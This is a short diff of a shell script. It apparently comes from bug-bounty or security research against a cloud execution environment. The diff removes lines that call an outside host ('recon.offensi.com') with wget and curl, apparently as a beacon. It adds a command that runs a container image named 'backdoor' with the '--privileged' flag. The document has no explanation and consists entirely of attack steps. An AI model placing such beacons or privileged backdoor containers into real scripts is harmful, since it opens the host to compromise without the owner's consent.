@@ -1,6 +1,2 @@
 #!/bin/sh
-wget recon.offensi.com
-curl recon.offensi.com
-echo foo
-sleep 100
-exit 666
+/usr/bin/docker run gcr.io/gcp-bugbounty/backdoor --privileged
